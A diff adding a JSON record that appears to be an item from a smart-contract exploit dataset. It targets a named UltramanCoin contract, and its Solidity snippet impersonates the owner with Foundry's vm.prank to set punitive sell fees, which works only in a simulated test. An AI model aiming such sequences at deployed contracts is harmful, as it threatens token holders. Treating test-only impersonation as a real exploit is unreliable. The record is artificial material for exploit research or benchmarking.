@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The `setSellFees` function on the UltramanCoin contract (0x733f8B3545a810214D2D27EEC8c60f93b561C050) is restricted by an `onlyOwner` modifier. An entity controlling the owner's address can abuse this privilege to set arbitrary fee rates, disrupting the contract's intended tokenomics.",
+  "interface_arsenal": "interface IUltramanCoin {\n    function setSellFees(\n        uint8 _rfi,\n        uint8 _treasury,\n        uint8 _dev,\n        uint8 _lp\n    ) external;\n\n    function owner() external view returns (address);\n}",
+  "attack_sequence": "// 1. Discover the owner's address\naddress owner = IUltramanCoin(TARGET).owner();\n\n// 2. Impersonate the discovered owner\nvm.prank(owner);\n\n// 3. Execute the privileged function call\nIUltramanCoin(TARGET).setSellFees(1, 50, 49, 0);",
+  "winning_reflection": "The exploit hinged on overcoming the 'Ownable: caller is not the owner' revert. The critical insight was to first identify the contract's actual owner by calling the public `owner()` view function, and then using a testing framework's impersonation feature (`vm.prank`) to execute the `setSellFees` call from the context of that specific owner address."
+}
